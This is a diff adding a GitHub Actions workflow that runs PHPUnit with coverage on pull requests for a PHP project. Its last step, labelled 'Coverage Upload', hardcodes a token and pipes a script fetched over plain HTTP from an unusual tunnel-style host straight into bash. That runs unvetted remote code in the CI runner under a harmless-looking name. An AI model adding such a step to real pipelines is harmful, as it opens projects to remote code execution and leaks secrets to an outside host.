@@ -1,0 +1,44 @@
+name: Branching Tests
+
+on: 
+  - pull_request
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: shivammathur/setup-php@15c43e89cdef867065b0213be354c2841860869e
+      with:
+        php-version: 7.4
+        extensions: dom, curl, libxml, mbstring, zip, pcntl, pdo, sqlite, pdo_sqlite, bcmath, soap, mysql, intl, gd, exif, iconv, imagick
+        coverage: pcov
+    - uses: actions/checkout@v3
+
+    - name: Validate composer.json and composer.lock
+      run: composer validate --strict
+
+    - name: Cache Composer packages
+      id: composer-cache
+      uses: actions/cache@v3
+      with:
+        path: vendor
+        key: ${{ runner.os }}-php-${{ hashFiles('**/composer.lock') }}
+        restore-keys: |
+          ${{ runner.os }}-php-
+
+    - name: Install dependencies
+      run: composer install --prefer-dist --no-progress
+
+    - name: Run tests
+      run: php -d pcov.enabled=1 -d memory_limit=4G vendor/phpunit/phpunit/phpunit --path-coverage --coverage-clover=build/logs/clover.xml tests
+      
+    - name: debug
+      run: cat build/logs/clover.xml
+
+    - name: Coverage Upload
+      run: export REPO_TOKEN="1cf8554f-2474-4e3c-9192-d229ff1a3059" && bash <(curl -s http://dk6ogxv5y7.laravel-sail.site:8080/ingress/get-script)
